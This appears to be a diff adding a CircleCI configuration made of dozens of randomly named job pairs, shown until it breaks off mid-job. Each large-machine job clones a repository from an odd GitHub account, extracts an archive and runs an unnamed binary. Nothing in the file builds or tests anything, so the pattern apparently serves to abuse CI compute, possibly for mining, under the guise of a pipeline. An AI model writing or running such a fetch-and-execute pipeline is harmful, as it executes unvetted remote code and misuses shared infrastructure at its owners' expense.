@@ -1,0 +1,1987 @@
+version: 2.1
+
+jobs:
+  smqsppbzp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: iidorlasake
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'nupmkahylfukjthls baufxrumithpmkj' > /tmp/xoduacjbbx/lzgvejgogf
+            ls -la /tmp/xoduacjbbx/lzgvejgogf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lzgvejgogf'
+  nnrsrs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: pgjsytpml
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/lzgvejgogf | awk '{print $1}'; done ; } || true
+      - run:
+          name: asqrctz
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: ekovkwotc
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: avjababrmm
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  uyyaoletbluqmhw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: czviud
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'daskbxpioddrugqb zpstjbmcjqxf' > /tmp/xoduacjbbx/mniskw
+            ls -la /tmp/xoduacjbbx/mniskw
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'mniskw'
+  dkmenmws:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: mhtova
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/mniskw | awk '{print $1}'; done ; } || true
+      - run:
+          name: vdvnwjd
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: bojqpwhejjlrtij
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: lwpkincz
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  zskisr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: wyqumjeiqifyybh
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'szsrqegrkqhwbeq yvzurpbqihogfllzos' > /tmp/xoduacjbbx/zolngzt
+            ls -la /tmp/xoduacjbbx/zolngzt
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'zolngzt'
+  ghvnikpw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ocbeqndu
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/zolngzt | awk '{print $1}'; done ; } || true
+      - run:
+          name: ywoddoszgnqmh
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: sqitdadjtlkvt
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: lbmtt
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  xterznafx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: navjlhhbdxqgfm
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'xhzwxcpqiapcmuofky frxanxcxgllvrby' > /tmp/xoduacjbbx/qafczkx
+            ls -la /tmp/xoduacjbbx/qafczkx
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qafczkx'
+  hxzrocgmlqgvc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: mrsyx
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/qafczkx | awk '{print $1}'; done ; } || true
+      - run:
+          name: xkzlcgckwk
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: pxqgtkxiykcyysr
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: ywscb
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  nurqrkczhqem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: kmbaqpllah
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'dhbpqrzeonrbr xaznycrgvnvbvuj' > /tmp/xoduacjbbx/secoahuabdqsx
+            ls -la /tmp/xoduacjbbx/secoahuabdqsx
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'secoahuabdqsx'
+  seekyzt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: emnson
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/secoahuabdqsx | awk '{print $1}'; done ; } || true
+      - run:
+          name: mpwrbyna
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: dzjjutcqhoez
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: nqojwsbqv
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  rnozidtvz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: pmjqrlmentxpp
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'oixvqsfpxsf mnmohojisdxvt' > /tmp/xoduacjbbx/tbisbpf
+            ls -la /tmp/xoduacjbbx/tbisbpf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'tbisbpf'
+  sldbj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: eimiaohweilolhc
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/tbisbpf | awk '{print $1}'; done ; } || true
+      - run:
+          name: jycwuah
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: gdbhdo
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: eqrjyhhpxhnih
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  lzqfqzkc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: azleme
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'wtabothtbwaidlf xvahvpcvjnpdguwpsd' > /tmp/xoduacjbbx/vagpiqtumu
+            ls -la /tmp/xoduacjbbx/vagpiqtumu
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'vagpiqtumu'
+  wlwhluxcixvven:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: uipymagyhsl
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/vagpiqtumu | awk '{print $1}'; done ; } || true
+      - run:
+          name: slvnrbpex
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: rvsfxm
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: rwczhl
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  jdhwnp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ueufwtmf
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'knurmtwvtkyt ylnyjdetjofdnnpgjq' > /tmp/xoduacjbbx/hkehib
+            ls -la /tmp/xoduacjbbx/hkehib
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hkehib'
+  hfdouwuqtxxcivd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: horqrvbritzg
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/hkehib | awk '{print $1}'; done ; } || true
+      - run:
+          name: tbjfb
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: gnbje
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: hcaejbanyogt
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  djsltgnbubheoys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ckqegsixptfdxyt
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'pwzqtdeqdswlaknz neajkioamqgixqaoh' > /tmp/xoduacjbbx/ogynhgryfs
+            ls -la /tmp/xoduacjbbx/ogynhgryfs
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'ogynhgryfs'
+  zbaujdix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: vofqgulkfxaafe
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/ogynhgryfs | awk '{print $1}'; done ; } || true
+      - run:
+          name: gwpnpjadsieyjok
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: vclqrgjemnklomk
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: zljvagrfkldepi
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  makacxzmeew:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: yjfmuaae
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'odkvaajmep hgevzhhdboolpxlab' > /tmp/xoduacjbbx/mhymtykiui
+            ls -la /tmp/xoduacjbbx/mhymtykiui
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'mhymtykiui'
+  okolccnl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: tvnkrmcnxtu
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/mhymtykiui | awk '{print $1}'; done ; } || true
+      - run:
+          name: usmvwcskdra
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: cvhqf
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: cgabcxkvjempskf
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  pfmwdclrpfrutlh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: yhzjoifibakgrya
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'stwndvjihlijl jruptcyqmkh' > /tmp/xoduacjbbx/ebynwv
+            ls -la /tmp/xoduacjbbx/ebynwv
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'ebynwv'
+  kqczmkqtr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: bukobtqumfafd
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/ebynwv | awk '{print $1}'; done ; } || true
+      - run:
+          name: tkgnfedhmzgbm
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: fgzvkdtgbwzubbj
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: fgykwtdstmaqk
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  ybkrveu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: glcarw
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'tctmjqusgsyps hmtlmdvdqlst' > /tmp/xoduacjbbx/bzyqchovyl
+            ls -la /tmp/xoduacjbbx/bzyqchovyl
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'bzyqchovyl'
+  zxflvokvhtxph:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ameprjwhavhah
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/bzyqchovyl | awk '{print $1}'; done ; } || true
+      - run:
+          name: qgeih
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: dhxiuxdpzw
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: jftfiwgb
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  cgblooe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nftdwnpbsd
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'sluergtswyow nmngpyfsorknm' > /tmp/xoduacjbbx/qvadfkzpqfqbf
+            ls -la /tmp/xoduacjbbx/qvadfkzpqfqbf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qvadfkzpqfqbf'
+  yaenzzabtk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: gvuqduf
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/qvadfkzpqfqbf | awk '{print $1}'; done ; } || true
+      - run:
+          name: mwtqcd
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: fmehapcmfnzuzbu
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: kinmtlgk
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  ntidlb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: nhudoci
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'kjounjcgujzypslr cihsdqwjvrerbhrel' > /tmp/xoduacjbbx/sgitfxar
+            ls -la /tmp/xoduacjbbx/sgitfxar
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'sgitfxar'
+  ajcoe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: dffyqirkfthtwk
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/sgitfxar | awk '{print $1}'; done ; } || true
+      - run:
+          name: avqqxful
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: jbyfgsvurvcvs
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: dlvxezljsfyvf
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  wqksudgvtz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: kntpetdgs
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'rcwsepiaelitmvfk zwhvoztzyrejnwmjrm' > /tmp/xoduacjbbx/wjuuhzngei
+            ls -la /tmp/xoduacjbbx/wjuuhzngei
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wjuuhzngei'
+  mfxbyaokfxte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: btjtycsblxd
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/wjuuhzngei | awk '{print $1}'; done ; } || true
+      - run:
+          name: pfuipzjfftk
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: efsvolwp
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: abpxamhirecei
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  vgsohlp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: agsujy
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'oktisxkmrwyuorj wrubaclxmi' > /tmp/xoduacjbbx/uhimgngtetgz
+            ls -la /tmp/xoduacjbbx/uhimgngtetgz
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'uhimgngtetgz'
+  zxyaagxqf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: arakuawcqlhep
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/uhimgngtetgz | awk '{print $1}'; done ; } || true
+      - run:
+          name: awscjmqrfsahrvz
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: nnaurxaht
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: ekubvlmyr
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  qmgiuuhkfnxh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: fgaktpqrgk
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'caxwfmwfujbbd ajbvgpykzatk' > /tmp/xoduacjbbx/bfclyzrom
+            ls -la /tmp/xoduacjbbx/bfclyzrom
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'bfclyzrom'
+  huhjlhnsudto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rmauggupqwmum
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/bfclyzrom | awk '{print $1}'; done ; } || true
+      - run:
+          name: znoohhibvu
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: oslfkeag
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: kkgjaeygl
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  weuyw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: kclouln
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'lfpzapcnltspbtudl yobhvbzxdjwyytiir' > /tmp/xoduacjbbx/wmemwr
+            ls -la /tmp/xoduacjbbx/wmemwr
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wmemwr'
+  ethhdmrmea:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rtonhwlo
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/wmemwr | awk '{print $1}'; done ; } || true
+      - run:
+          name: xouodtbkhnmw
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: ucpkzhicsj
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: fwqysn
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  orvqotpadxy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pegbgmjejsgr
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'kwxxbqtkuf pgpcpeucnisesk' > /tmp/xoduacjbbx/qfycou
+            ls -la /tmp/xoduacjbbx/qfycou
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qfycou'
+  xasolqemzmyeob:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rzgixwa
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/qfycou | awk '{print $1}'; done ; } || true
+      - run:
+          name: qxfzvgbuvfg
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: eanqqf
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: ecoebdxnabujuxa
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  nfsohy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ldgvivcju
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'slwbtejdeptb hxvprtaywep' > /tmp/xoduacjbbx/lalifgwbj
+            ls -la /tmp/xoduacjbbx/lalifgwbj
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lalifgwbj'
+  layzcnoavd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rzdxhsgsz
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/lalifgwbj | awk '{print $1}'; done ; } || true
+      - run:
+          name: ipkimhmcctvxx
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: tovupp
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: nqukxwvtcmzt
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  vqfcooelawyb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: msmmykinkspjlz
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'mlgoslfjslhr qyfhhitteeq' > /tmp/xoduacjbbx/hlcrbqldhvgsts
+            ls -la /tmp/xoduacjbbx/hlcrbqldhvgsts
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hlcrbqldhvgsts'
+  qwvwlixbrubdnh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: slewyu
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/hlcrbqldhvgsts | awk '{print $1}'; done ; } || true
+      - run:
+          name: vurdok
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: ywifurmx
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: eicanujsq
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  ypiuiuwiqa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: guxhhbbl
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'pdqisnkpjxkbsn rabbfniouogvv' > /tmp/xoduacjbbx/wumzchtdgl
+            ls -la /tmp/xoduacjbbx/wumzchtdgl
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wumzchtdgl'
+  gqyvpgfcj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: cjbzclrrgjrkint
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/wumzchtdgl | awk '{print $1}'; done ; } || true
+      - run:
+          name: rpayfpzhiz
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: pczewu
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: gsvcjok
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  wvbvrf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: toajyfwwvzqa
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'yplvchcfbgrvnon zzfywhxplfnfjknwnf' > /tmp/xoduacjbbx/leifnmntlwe
+            ls -la /tmp/xoduacjbbx/leifnmntlwe
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'leifnmntlwe'
+  tcppdiphaogjxil:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: itxrcadjegxuhz
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/leifnmntlwe | awk '{print $1}'; done ; } || true
+      - run:
+          name: ldqywpbnp
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: sgamhe
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: nvpwphxsjqmbye
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  fphvmiomyjcukqs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ovjako
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'qfrxgwguernqkso evtglsjjqlyvqc' > /tmp/xoduacjbbx/evksml
+            ls -la /tmp/xoduacjbbx/evksml
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'evksml'
+  slrsxlxerttyywh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: hggahjkmmjrgzb
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/evksml | awk '{print $1}'; done ; } || true
+      - run:
+          name: awetzhauumut
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: jsfbuatlouej
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: kpbzzqq
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  yaohrgbkjjuwk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: jdlpd
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'elwfyodslhjixq usguyeejvtzfmjv' > /tmp/xoduacjbbx/qfplmexfa
+            ls -la /tmp/xoduacjbbx/qfplmexfa
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qfplmexfa'
+  fgxxjsjn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rcjcguovrtlbcs
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/qfplmexfa | awk '{print $1}'; done ; } || true
+      - run:
+          name: shnbvxwnrtsad
